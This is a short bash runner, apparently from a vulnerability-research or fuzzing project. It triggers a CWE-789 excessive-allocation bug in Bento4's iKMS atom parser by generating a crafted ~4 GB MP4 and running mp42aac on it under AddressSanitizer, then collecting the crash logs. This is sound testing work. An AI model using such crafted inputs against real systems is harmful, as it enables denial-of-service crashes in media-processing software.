#!/bin/bash
# vuln_001_run.sh
# PoC runner for CWE-789 in Bento4 AP4_IkmsAtom (Ap4IkmsAtom.cpp lines 77-92)
#
# Note on mmap_limit_mb:
#   The ASAN allocator uses mmap for large (> threshold) allocations and may
#   succeed via MAP_NORESERVE on systems with overcommit enabled.  Setting
#   mmap_limit_mb triggers ASAN's own guard, which aborts the process when the
#   requested allocation would push total heap-mmap above the limit.
#   mmap_limit_mb=2000 (2 GB) comfortably rejects the ~4 GB iKMS allocation
#   while permitting normal startup overhead (typically < 50 MB of heap mmap).

OUTPUT_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IkmsAtom_h"

# Step 1: Generate the crafted MP4 file (sparse, ~4 GB)
python3 "${OUTPUT_DIR}/vuln_001_gen.py"

# Step 2: Run mp42aac with ASAN options
ASAN_OPTIONS="abort_on_error=0:mmap_limit_mb=2000:log_path=/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IkmsAtom_h/asan.log" \
  /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac \
  /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IkmsAtom_h/vuln_001.mp4 \
  /dev/null \
  > /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IkmsAtom_h/vuln_001_result.txt 2>&1 || true

# Step 3: Append any ASAN/UBSAN error logs
for log in "${OUTPUT_DIR}"/asan.log.*; do
  if [ -f "$log" ]; then
    echo "" >> "${OUTPUT_DIR}/vuln_001_result.txt"
    echo "=== ASAN log: $log ===" >> "${OUTPUT_DIR}/vuln_001_result.txt"
    cat "$log" >> "${OUTPUT_DIR}/vuln_001_result.txt"
  fi
done
